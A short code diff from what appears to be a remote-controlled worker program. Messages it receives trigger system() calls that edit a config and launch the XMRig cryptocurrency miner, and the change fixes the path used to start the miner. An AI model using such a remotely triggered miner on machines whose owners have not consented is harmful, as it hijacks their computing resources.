@@ -117,8 +117,7 @@ int main() {
 		    system("./conf"); // change config.json file (rename "name_of_the_worker" to exec(hostname))
                 }
                 else if(msg[1] == "run_xmrig") {
-                    system("cd xmrig-6.22.2");
-                    system("./xmrig");
+                    system("./EchoBreak-xmrig/xmrig-6.22.2/xmrig");
                 }
             }
             memset(buffer, 0, sizeof(buffer));
